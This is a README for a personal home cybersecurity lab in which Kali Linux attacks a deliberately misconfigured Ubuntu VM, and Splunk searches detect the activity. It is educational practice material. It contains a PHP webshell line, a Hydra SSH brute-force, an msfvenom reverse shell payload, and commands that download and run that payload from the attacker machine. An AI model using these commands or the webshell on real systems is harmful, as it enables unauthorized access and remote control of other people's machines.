# 🧪 Home Cybersecurity Lab – Kali + Vulnerable Ubuntu VM

Welcome to my home lab — a virtual environment built to simulate real-world cybersecurity scenarios using **Kali Linux** as the attacker machine and a misconfigured **Ubuntu VM** as the target. This project demonstrates vulnerability exploitation, monitoring, and detection using tools like **Hydra**, and **Splunk**.

>  This is a personal showcase project to demonstrate hands-on cybersecurity skills.  
>  Built entirely with VirtualBox and open-source tools.

---

## Lab Goals

- Create a vulnerable target system from scratch
- Perform attacks using Kali Linux
- Monitor logs and detect malicious activity

---

## Lab Setup

### Machines Used:

| Role      | OS           | Purpose                 |
|-----------|--------------|-------------------------|
| Attacker  | Kali Linux   | Penetration testing     |
| Victim    | Ubuntu 22.04 | Deliberately misconfigured |

### Virtualization:

- Software: [VirtualBox](https://www.virtualbox.org/)
- Network: Host-only Adapter (192.168.56.0/24)
- SSH/FTP ports exposed locally for testing

---

## Vulnerabilities Introduced

On the **Ubuntu VM**, I manually created misconfigurations:

1. **Weak credentials**
   - User: `testuser`
   - Password: `password`

2. **Insecure SSH config**
   - Password auth enabled
   - Root login allowed

3. **Open & misconfigured FTP server**
   - Anonymous access
   - No encryption

4. **PHP Webshell Backdoor**
   ```php
   <?php system($_GET['cmd']); ?>

**1. Nmap scan**
 ```python
   nmap -sn 192.168.56.0/24
   nmap -sC -sV -p- -oN fullscan.txt <Ubuntu_IP>
```
**2. Brute-Force SSH**
 ```python
   hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://<Ubuntu_IP>
   ssh testuser@<Ubuntu_IP>
 ```
**3. Generate Payload on Kali**
  ```python
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f elf -o file.elf
  ```
**3. Transfering Payload to Victim**
  
  set up a listener first:
  ```python
   nc -lvnp 4444
  ```
  Serve HTTP:
  ```python
  python3 -m http.server 8080
  ```
  on Ubuntu run:
 ```python
  wget http://<Kali_IP>:8080/file.elf
  chmod +x file.elf
  ./file.elf
 ```
5. **Detection with Splunk**
    1. Installed Splunk on Ubuntu:
   ```python
    wget -O splunk.deb https://download.splunk.com/products/splunk/releases/9.2.1/linux/splunk-9.2.1-<build>.deb
    sudo dpkg -i splunk.deb
    sudo /opt/splunk/bin/splunk start --accept-license
    sudo /opt/splunk/bin/splunk enable boot-start
   ```
    2. Log Sources:

    Monitored /var/log/auth.log, /var/log/apache2/access.log, and /var/log/syslog

**Searches**:

    index=_internal OR index=main

    "Failed password"

    "Accepted password"

    source="/var/log/auth.log"

    host="ubuntu-victim"

**What I Learned**

* How to safely simulate and exploit common vulnerabilities

* How to use tools like Nmap, Hydra and msfvenom

* How attackers leave traces in system logs

* How to use Splunk to detect unauthorized access

* How to document and present cybersecurity projects professionally

**Next Steps**


* Add more vulnerable services (e.g., MySQL, Redis)

* Try privilege escalation post-exploitation

* Automate some attacks with scripts

* Connect Splunk to a SIEM pipeline 



**Want to collab or ask questions?**

* [LinkedIn](https://www.linkedin.com/in/klaudija-balsyte-60b386251/)

* [Github](https://github.com/shoganaiix)
